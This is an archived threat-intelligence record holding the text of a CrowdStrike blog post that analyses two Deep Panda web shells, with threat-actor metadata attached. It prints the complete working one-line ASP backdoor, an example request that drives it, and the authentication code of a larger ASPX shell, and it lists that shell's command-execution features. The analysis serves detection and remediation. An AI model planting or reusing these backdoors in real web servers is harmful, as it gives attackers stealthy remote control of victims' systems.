{
    "id": "3264247d-4f6c-4f0b-ba17-dc05b0f530c9",
    "created_at": "2022-10-25T16:48:12.228173Z",
    "updated_at": "2025-03-27T02:16:42.983569Z",
    "deleted_at": null,
    "sha1_hash": "76a6ea858e3524682ad3ee30251003228db50fb3",
    "title": "Mo' Shells Mo' Problems - Deep Panda Web Shells",
    "authors": "Crowdstrike",
    "file_creation_date": "2014-07-09T14:33:26Z",
    "file_modification_date": "2014-07-09T14:33:26Z",
    "file_size": 210162,
    "plain_text": "## Disclaimer: CrowdStrike derived this information from investigations in non-classified\n\n environments. Since we value our client's privacy and interests, some data has been redacted\n\n or sanitized.\n\n Crowdstrike presents “Mo’ Shells Mo’ Problems” - A four part series featuring two unique web\n\n shells used by a Chinese threat group we call Deep Panda. The series will culminate with a\n\n CrowdCast in April 2014 detailing a case study of the incident response investigation\n\n conducted to identify these web shells. Special thanks to Josh Phillips of the CrowdStrike\n\n Global Intelligence Team for providing the technical analysis in this blog post.\n\n Today we’ll cover part one of this series, which provides an overview of what web shells are,\n\n functionality of two web shells recently identified during an incident response investigation\n\n and how they were leveraged by the attacker.\n\n Parts two through four will provide details on successful analytical techniques you can use to\n\n discover web shells within your environment:\n\n\n-----\n\n## Mo’ Shells Mo’ Problems: File Stacking (Part 2)\n\n Mo’ Shells Mo’ Problems: Web Log Review (Part 3)\n\n Mo’ Shells Mo’ Problems: Network Detection (Part 4)\n\n A Web Shell is a file containing backdoor functionality written in a web scripting language\n\n such ASP, ASPX, PHP or JSP. When a web shell is hosted on an internet facing victim\n\n system, an adversary can remotely access the system to perform malicious actions. Deep\n\n Panda is a China based threat group CrowdStrike has observed targeting companies in the\n\n defense, legal, telecommunication and financial industries. Crowdstrike has observed Deep\n\n Panda adopting web shells as their primary access back into a victim organization. This is an\n\n interesting shift as web shells have typically been seen as only a first stage into obtaining a\n\n persistent foothold in an environment. Previously, web shells were quickly abandoned once\n\n persistent second stage malware was successfully beaconing. Using a web shell as a primary\n\n backdoor gives Deep Panda several advantages:\n\n Low to virtually no detection by antivirus products\n\n The absence of command and control beacon traffic\n\n Impossible to block known malicious IP addresses to a web server since adversary can\n\n easily change their source IP address\n\n Cookie and HTTP header authentication aware web shells avoid being enumerated by\n\n search engines and restrict access, further reducing their network footprint\n\n To assist organizations with identifying web shells in their environment, this post will cover\n\n two popular Deep Panda web shells. By gaining insight into their capabilities and footprint,\n\n organizations should find it feasible to detect and remediate these backdoors.\n\n Showimg.asp\n\nPath: E:\\inetpub\\wwwroot\\<Redacted>\\\nMD5 Hash: ffa82c64720179878b25793f17b304d7\nFile Size: 28\n\n## Table 1: \"Showimg.asp\" Metadata\n\n|Path:|E:\\inetpub\\wwwroot\\<Redacted>\\|\n|---|---|\n|MD5 Hash:|ffa82c64720179878b25793f17b304d7|\n|File Size:|28|\n\n\n-----\n\n## a network. After it is replaced by more robust backdoors, it may be left in place as a last\n\n resort should remediation take place. At a diminutive 28 bytes, it is one of the smallest Active\n\n Server Page (ASP) backdoors in the wild. In a recent case, we witnessed this web shell written\n\n to a standalone file (named showimg.asp), but it could easily be injected into an existing page,\n\n making it even stealthier. The code for this web shell can be found below:\n\n<%execute request(chr(42))%>\n\n## Table 2: \"Showimg.asp\" Web Shell Script\n\n ASP uses Microsoft Visual Basic (VBScript) as its implementation language. The code above\n\n uses the chr() function to convert an integer into a character, which is then passed as an\n\n argument to the ASP Request() object.\n\n The Request() object will search the Query String for any keys matching the input. In our\n\n case, the code is equivalent to Request.QueryString(‘*’). The request object will look for\n\n chr(42) which is an asterisk (*), returning whatever is passed to it in a HTTP GET or POST.\n\n Next, the Execute() function will execute any value returned by the lookup. Effectively, an\n\n attacker can form a request that will execute any VBScript code. As you might imagine, this is\n\n a powerful capability. For example, this code can perform any of the following actions:\n\n File upload or download\n\n File system read, write, or delete\n\n Arbitrary command execution\n\n This web shell is an example of a “thick client” shell, meaning that while the server side code\n\n is quite small, attackers typically use a larger GUI client to construct the sent commands. The\n\n client GUI runs on the attacker’s system and hence is not typically found within the victim\n\n network.\n\n As a simple example of an encoded command, the following GET request would cause the\n\n backdoor to execute the code Response.Write(“<h1>Hello World</h1>”) and would render\n\n “Hello World” to be printed in the web browser:\n\nhttp://<webserver>/showimage.asp*=%52%65%73%70%6F%\n\n\n-----\n\n%6C%6C%6F%20%57%6F%72%6C%64%3C%2F%68%31%3E%22%29\n\n## Table 3: \"showimg.asp\" Web Shell Script\n\n System_web.aspx\n\nPath: C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\<VERSION>\\\nMD5 Hash: cc875db104a602e6c12196fe90559fb6\nFile Size: 45187\n\n## Table 4: Metadata of \"system_web.aspx\"\n\n System_web.aspx is an excellent example of a more robust web shell used to replace Deep\n\n Panda’s traditional beaconing command and control infrastructure. It is an ASP.NET\n\n backdoor written in C#, with far more capabilities than we saw with the showimage.asp\n\n sample.\n\n The web shell supports a form of authentication to protect against unauthorized access. This\n\n prevents its discovery from search engine indexing, vulnerability scanning tools and other\n\n unauthorized access to the backdoor. In order to bypass authentication, a user session must\n\n satisfy one of three options:\n\n Pass a cookie with the name <Redacted>\n\n Set the Keep-Alive HTTP header to 320\n\n Set language HTTP header to contain es-DN\n\n Since web shells are text-based, we can easily see how this authentication takes place:\n\ntry\n\n{\n\nInit();\n\nif (!IsUserValid())\n\n{\n\ntry\n\n{\n\n|Path:|C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\<VERSION>\\|\n|---|---|\n|MD5 Hash:|cc875db104a602e6c12196fe90559fb6|\n|File Size:|45187|\n\n\n-----\n\nPage.Visible = true;\n\n}\n\ncatch (Exception)\n\n{\n\nPage.Visible = false;\n\nResponse.Clear();\n\nResponse.End();\n\n}\n\n}\n\nelse\n\n{\n\nPage.Visible = true;\n\nResponse.SetCookie(new HttpCookie(\"REDACTED\", DateTime.Now.Second.ToString()));\n\n}\n\n}\n\ncatch (Exception)\n\n{\n\nPage.Visible = false;\n\nResponse.End();\n\n}\n\nprivate void Init()\n\n{\n\ntry\n\n{\n\nif (Request.Cookies[\"cp\"] != null)\n\n{\n\nFile.Copy(Request.PhysicalPath, Request.Cookies[\"cp\"].Value, true);\n\nResponse Cookies[\"cp\"] Expires = DateTime Now AddDays( 1);\n\n\n-----\n\n}\n\n}\n\ncatch (Exception ex)\n\n{\n\nLog(ex.ToString());\n\n}\n\n}\n\nprivate bool IsUserValid()\n\nif (Request.Headers[\"Keep-Alive\"] == \"320\")\n\nreturn true;\n\nif (Request.UserLanguages.Length > 0)\n\nforeach (string s in Request.UserLanguages)\n\nif (s.IndexOf(\"es-DN\") >= 0)\n\nreturn true;\n\ncatch (Exception)\n\nreturn false;\n\n## Table 5: \"system_web.aspx\" Authentication Code\n\n First, the code checks if a cookie by the name of cp exists. If so, the response object has its\n\n End() method invoked, denying the user access. Next, the code uses the IsValidUser()method\n\n and checks the Hyper Text Transport Protocol (HTTP) headers for the Keep-Alive value,\n\n which, if equal to 320, will return true. If the value does not equal 320 the\n\n IsValidUser()method iterates over the Request.UserLanguages collection searching for a\n\n language named es-DN, and if found, the IsValidUser() method will return true. If neither\n\n check passes, the code returns false and the code will finally check for the presence of a cookie\n\n named <REDACTED>. If the cookie is present, the authentication step is satisfied. If not, a\n\n blank web page with no content is displayed.\n\n After successful authentication, the attacker is provided with the following page:\n\n\n-----\n\n## System_web.aspx packs a large amount of functionality into a compact interface. It provides\n\n the following capabilities:\n\n Enumerate attached drives\n\n Utilize built in SQL functions to connect to database backend\n\n Run SQL queries and statements\n\n Download, upload and read files\n\n Directory listing\n\n Execute Active Directory requests\n\n Compile and execute arbitrary C# source code\n\n Impersonate a user\n\n The web shell supports 8 main commands, with most command execution via Transact-SQL\n\n using the xp_cmdshell function.\n\n Exec\n\n This command depends on the contents of the first unlabeled textbox1. If unlabeled textbox1\n\n is empty, the code will enumerate attached drives.\n\n Provider= or Driver= - Will connect using the OleDbConnection class.\n\n Data Source= - The code will connect using the SqlConnection class.\n\n iis:// - If this appears in unlabeled textbox1, the code will use data from the second\n\n unlabeled textbox2 to execute Active Directory requests.\n\n Down\n\n\n-----\n\n## empty, the code will assume a valid path to a file on the local machine and will read and\n\n display contents to user.\n\n Data Source= - the code will assume that the unlabeled textbox2 contains a valid SQL\n\n query and will execute it and display the results.\n\n http:// - If this appears in unlabeled textbox1, download content from the assumed\n\n URL.\n\n $SEX – If this appears in unlabeled textbox1, pass the contents to the Server.Execute()\n\n method.\n\n BF\n\n Execute contents in unlabeled textbox1 as a SQL query and return binary data to adversary.\n\n GF\n\n Execute contents in unlabeled textbox1 as a SQL statement and return valid textual data to\n\n adversary.\n\n TF\n\n Upload the file chosen by the Choose File button and save it to a temporary table in the\n\n database file worktbl in chunks of 10240 bytes. Then executes xp_cmdshell (which executes\n\n the Bulk Copy Program) to copy the data from that table to a file whose name is specified in\n\n unlabeled textbox2. After the file is saved, the code deletes the temporary table.\n\n RF\n\n If unlabeled textbox1 is a local file on infected system, the file is read and displayed to\n\n attacker.\n\n \\\\ - If unlabeled textbox1 starts with \\\\, use xp_cmdshell to execute the copy command\n\n to copy file to %windir%\\Temp\\temp.bin. Then, issue the dir command and display\n\n results to user. Finally, delete the temporary file %windir%\\Temp\\temp.bin.\n\n DIR\n\n\n-----\n\n## while any query not matching those is executed directly. All commands are executed using the\n\n System.DirectoryServices API.\n\n Eva\n\n Simple wrapper around the CSharpCodeProvider API, allowing the adversary to compile and\n\n execute arbitrary C# source code.\n\n Login Checkbox\n\n Attempt to use the username, password, and domain from the User, Pass and Domain fields\n\n and LogonUserA() Win32 API function to impersonate a specific user.\n\n Detatch Checkbox\n\n Specifies whether commands run from the Exec button will have their output redirected and\n\n displayed to the adversary when the command is finished executing.\n\n In short, system_web.aspx provides an adversary with a very stealthy means of near full\n\n control of the server on which it resides. This stealth might be its most important attribute.\n\n As we will see, identifying web shells can be much harder than finding malicious binaries. In\n\n our next post, we will discuss techniques for identifying web shells.\n\n Stay tuned for Parts 2-4 as we cover File Stacking, Web Log Review, and Network Detection.\n\n In the meantime, register now for the April 1st CrowdCast.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/pn1mtot3a2d2seuqx46unamdl7udlwq0",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2014/2014.02.20.deep-panda-webshells/deep-panda-webshells.pdf"
    ],
    "report_names": [
        "deep-panda-webshells"
    ],
    "threat_actors": [
        {
            "id": "7a9a7873-8e41-40ae-9d06-b27c92bb54e4",
            "created_at": "2022-10-25T16:47:55.568362Z",
            "updated_at": "2025-03-27T02:05:17.264615Z",
            "deleted_at": null,
            "main_name": "BRONZE FIRESTONE",
            "aliases": [
                "C0d0s0",
                "Deep Panda ",
                "Pupa ",
                "TG-3551 ",
                "APT19 "
            ],
            "source_name": "Secureworks:BRONZE FIRESTONE",
            "tools": [
                " Alice's Rabbit Hole",
                " Briba",
                " Cobalt Strike",
                " Derusbi",
                " PlugX",
                " PoisonIvy",
                " Powershell Empire",
                " Zuguo",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2f07a03f-eb1f-47c8-a8e9-a1a00f2ec253",
            "created_at": "2022-10-25T16:07:24.277669Z",
            "updated_at": "2025-03-27T02:02:10.157972Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Operation LagTime IT",
                "Operation StealthyTrident",
                "ThunderCats"
            ],
            "source_name": "ETDA:TA428",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agent.dhwf",
                "Albaniiutas",
                "BlueTraveller",
                "Chymine",
                "Cotx RAT",
                "CoughingDown",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "LuckyBack",
                "PhantomNet",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "RoyalRoad",
                "SManager",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TManger",
                "TVT",
                "Thoper",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "64ca1755-3883-4173-8e0a-6e5cf92faafd",
            "created_at": "2022-10-25T15:50:23.636456Z",
            "updated_at": "2025-03-27T02:00:55.51077Z",
            "deleted_at": null,
            "main_name": "Deep Panda",
            "aliases": [
                "Deep Panda",
                "Shell Crew",
                "KungFu Kittens",
                "PinkPanther",
                "Black Vine"
            ],
            "source_name": "MITRE:Deep Panda",
            "tools": [
                "Mivast",
                "StreamEx",
                "Sakula",
                "Tasklist",
                "Derusbi"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "46a151bd-e4c2-46f9-aee9-ee6942b01098",
            "created_at": "2023-01-06T13:46:38.288168Z",
            "updated_at": "2025-03-27T02:00:02.794118Z",
            "deleted_at": null,
            "main_name": "APT19",
            "aliases": [
                "Black Vine",
                "TEMP.Avengers",
                "PinkPanther",
                "G0073",
                "KungFu Kittens",
                "Group 13",
                "Shell Crew",
                "BRONZE FIRESTONE",
                "G0009",
                "Sunshop Group",
                "DEEP PANDA",
                "Codoso"
            ],
            "source_name": "MISPGALAXY:APT19",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "0639667a-fb3f-43d9-a38c-6c123fd19c7f",
            "created_at": "2022-10-25T16:07:23.335869Z",
            "updated_at": "2025-03-27T02:02:09.743237Z",
            "deleted_at": null,
            "main_name": "APT 19",
            "aliases": [
                "APT 19",
                "Bronze Firestone",
                "C0d0so0",
                "Codoso",
                "Deep Panda",
                "Operation Kingslayer",
                "Red Pegasus",
                "Sunshop Group",
                "TG-3551"
            ],
            "source_name": "ETDA:APT 19",
            "tools": [
                "Agentemis",
                "C0d0so0",
                "Cobalt Strike",
                "CobaltStrike",
                "Derusbi",
                "EmPyre",
                "EmpireProject",
                "Fire Chili",
                "PowerShell Empire",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041802,
    "ts_creation_date": 1404916406,
    "ts_modification_date": 1404916406,
    "files": {
        "pdf": "https://archive.orkl.eu/76a6ea858e3524682ad3ee30251003228db50fb3.pdf",
        "text": "https://archive.orkl.eu/76a6ea858e3524682ad3ee30251003228db50fb3.txt",
        "img": "https://archive.orkl.eu/76a6ea858e3524682ad3ee30251003228db50fb3.jpg"
    }
}